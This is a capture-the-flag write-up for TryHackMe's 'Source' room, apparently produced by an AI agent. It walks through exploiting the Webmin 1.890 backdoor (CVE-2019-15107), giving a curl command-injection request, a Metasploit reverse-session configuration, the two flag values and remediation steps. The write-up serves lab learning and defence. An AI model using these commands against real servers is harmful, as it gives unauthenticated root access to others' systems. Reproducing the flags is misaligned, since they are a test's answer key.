# Source CTF Writeup - TryHackMe
(*solved by gemini-cli*)

## Challenge Information
- **Name:** Source
- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Target IP:** 10.48.144.202
- **Objective:** Gain root access and capture `user.txt` and `root.txt`.

---

## 1. Enumeration

### Nmap Scan
The initial scan revealed two open ports:
- **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3)
- **Port 10000:** Webmin (MiniServ 1.890)

```bash
nmap -sV -sC -p- 10.48.144.202
```

The Webmin version `1.890` is notably vulnerable to an unauthenticated Remote Code Execution (RCE) flaw.

---

## 2. Vulnerability Analysis

### CVE-2019-15107 (Webmin Backdoor)
Webmin versions 1.890 through 1.920 contained a backdoor in the `password_change.cgi` script. This vulnerability allows an unauthenticated attacker to execute arbitrary commands with root privileges by providing a specially crafted `user` parameter.

The vulnerability exists because the code improperly handled the `user` parameter when the "password change" feature was enabled, even if the user didn't exist.

---

## 3. Exploitation

### Manual Verification
The vulnerability can be manually verified using `curl`. By injecting a command into the `user` parameter via the `password_change.cgi` endpoint, we can achieve blind RCE.

```bash
curl -k -H "Referer: https://10.48.144.202:10000/session_login.cgi" \
     -d 'user=root&pam=&old=passwd&new1=passwd&new2=passwd&old_pass=passwd&old_pass2=passwd&cmd=`id`' \
     https://10.48.144.202:10000/password_change.cgi
```

### Metasploit Exploitation
For a more stable shell, the Metasploit module `exploit/linux/http/webmin_backdoor` was used. 

**Critical Step:** Since Webmin on this target is configured to use HTTPS, the `SSL` option in Metasploit **must** be set to `true`.

#### Configuration:
```bash
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.48.144.202
set LHOST <YOUR_IP>
set SSL true
set LPORT 4444
run
```

---

## 4. Post-Exploitation & Flag Retrieval

Once the session was established, we had immediate root access (`uid=0`).

### User Flag
Located in the home directory of the default user.
- **Path:** `/home/dark/user.txt`
- **Flag:** `THM{SUPPLY_CHAIN_COMPROMISE}`

### Root Flag
Located in the root user's home directory.
- **Path:** `/root/root.txt`
- **Flag:** `THM{UPDATE_YOUR_INSTALL}`

---

## 5. Summary & Remediation
The "Source" challenge demonstrates the severe impact of supply-chain compromises and the importance of keeping administrative software up to date.

### Remediation:
1. **Update Webmin:** Upgrade to the latest version of Webmin (version 1.930 or higher patched this specific vulnerability).
2. **Restrict Access:** Administrative interfaces like Webmin should not be exposed to the public internet. Use a VPN or IP whitelisting to restrict access.
3. **Disable Unused Features:** If the password change functionality is not required, it should be disabled.

```